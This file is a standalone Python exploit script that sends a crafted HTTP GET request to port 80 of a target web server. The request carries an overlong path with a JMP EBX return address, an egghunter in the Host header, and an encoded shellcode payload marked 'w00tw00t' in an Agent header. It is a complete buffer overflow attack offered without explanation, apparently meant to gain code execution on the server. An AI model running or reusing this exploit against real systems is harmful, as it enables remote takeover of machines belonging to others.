#!/usr/bin/python
import socket

host = "your ip"
port = 80

# JMP EBX: 77C11F13
jmp_ebx = "\x13\x1f\xc1\x77"
x=240

egg = "w00t"

egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"


buf =  b""
buf += b"\xda\xd8\xba\x1e\xb6\x70\x96\xd9\x74\x24\xf4\x5d"
buf += b"\x29\xc9\xb1\x52\x31\x55\x17\x03\x55\x17\x83\xf3"
buf += b"\x4a\x92\x63\xf7\x5b\xd1\x8c\x07\x9c\xb6\x05\xe2"
buf += b"\xad\xf6\x72\x67\x9d\xc6\xf1\x25\x12\xac\x54\xdd"
buf += b"\xa1\xc0\x70\xd2\x02\x6e\xa7\xdd\x93\xc3\x9b\x7c"
buf += b"\x10\x1e\xc8\x5e\x29\xd1\x1d\x9f\x6e\x0c\xef\xcd"
buf += b"\x27\x5a\x42\xe1\x4c\x16\x5f\x8a\x1f\xb6\xe7\x6f"
buf += b"\xd7\xb9\xc6\x3e\x63\xe0\xc8\xc1\xa0\x98\x40\xd9"
buf += b"\xa5\xa5\x1b\x52\x1d\x51\x9a\xb2\x6f\x9a\x31\xfb"
buf += b"\x5f\x69\x4b\x3c\x67\x92\x3e\x34\x9b\x2f\x39\x83"
buf += b"\xe1\xeb\xcc\x17\x41\x7f\x76\xf3\x73\xac\xe1\x70"
buf += b"\x7f\x19\x65\xde\x9c\x9c\xaa\x55\x98\x15\x4d\xb9"
buf += b"\x28\x6d\x6a\x1d\x70\x35\x13\x04\xdc\x98\x2c\x56"
buf += b"\xbf\x45\x89\x1d\x52\x91\xa0\x7c\x3b\x56\x89\x7e"
buf += b"\xbb\xf0\x9a\x0d\x89\x5f\x31\x99\xa1\x28\x9f\x5e"
buf += b"\xc5\x02\x67\xf0\x38\xad\x98\xd9\xfe\xf9\xc8\x71"
buf += b"\xd6\x81\x82\x81\xd7\x57\x04\xd1\x77\x08\xe5\x81"
buf += b"\x37\xf8\x8d\xcb\xb7\x27\xad\xf4\x1d\x40\x44\x0f"
buf += b"\xf6\xaf\x31\x15\x86\x58\x40\x29\x97\xc4\xcd\xcf"
buf += b"\xfd\xe4\x9b\x58\x6a\x9c\x81\x12\x0b\x61\x1c\x5f"
buf += b"\x0b\xe9\x93\xa0\xc2\x1a\xd9\xb2\xb3\xea\x94\xe8"
buf += b"\x12\xf4\x02\x84\xf9\x67\xc9\x54\x77\x94\x46\x03"
buf += b"\xd0\x6a\x9f\xc1\xcc\xd5\x09\xf7\x0c\x83\x72\xb3"
buf += b"\xca\x70\x7c\x3a\x9e\xcd\x5a\x2c\x66\xcd\xe6\x18"
buf += b"\x36\x98\xb0\xf6\xf0\x72\x73\xa0\xaa\x29\xdd\x24"
buf += b"\x2a\x02\xde\x32\x33\x4f\xa8\xda\x82\x26\xed\xe5"
buf += b"\x2b\xaf\xf9\x9e\x51\x4f\x05\x75\xd2\x7f\x4c\xd7"
buf += b"\x73\xe8\x09\x82\xc1\x75\xaa\x79\x05\x80\x29\x8b"
buf += b"\xf6\x77\x31\xfe\xf3\x3c\xf5\x13\x8e\x2d\x90\x13"
buf += b"\x3d\x4d\xb1"


buffer =  "GET /" + (230) * "A" + jmp_ebx + "A" * (240-230-4)  + " HTTP/1.1\r\n"
buffer += "Host: " + "\x90" * 10 + egghunter + "\r\n"
buffer += "Agent: w00tw00t" + buf + "\r\n\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()